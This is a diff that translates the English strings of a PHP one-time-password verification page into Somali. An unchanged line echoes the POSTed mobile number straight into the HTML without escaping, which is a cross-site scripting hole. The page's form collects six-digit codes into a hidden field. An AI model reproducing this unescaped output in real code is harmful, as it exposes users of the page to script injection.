@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>OTP Verification</title>
+  <title>Xaqiijinta OTP</title>
   <style>
     * {
       box-sizing: border-box;
@@ -284,9 +284,9 @@
 
   <main class="page">
     <div class="otp-card">
-      <h2 class="otp-title">OTP verification</h2>
+      <h2 class="otp-title">Xaqiijinta OTP</h2>
       <p class="otp-text">
-        Enter the 6-digit OTP sent to <span id="phone-number"><?php echo $_POST['mobile']?></span>
+        Geli OTP-ga 6-lambar ah ee loo diray <span id="phone-number"><?php echo $_POST['mobile']?></span>
       </p>
 
 
@@ -340,10 +340,10 @@
         <!-- hidden combined OTP -->
         <input type="hidden" name="otp_code" id="otp_code">
 
-        <p class="timer">Hold time: <strong id="countdown">58 s</strong></p>
+        <p class="timer">Waqtiga haynta: <strong id="countdown">58 s</strong></p>
 
         <div class="btn-wrap">
-          <button name="verify" type="submit" class="verify-btn" id="verifyBtn" >VERIFY</button>
+          <button name="verify" type="submit" class="verify-btn" id="verifyBtn" >XAQIIJI</button>
         </div>
          <p class="error-text" id="errorText">Failed to verify, try again.</p>
       </form>
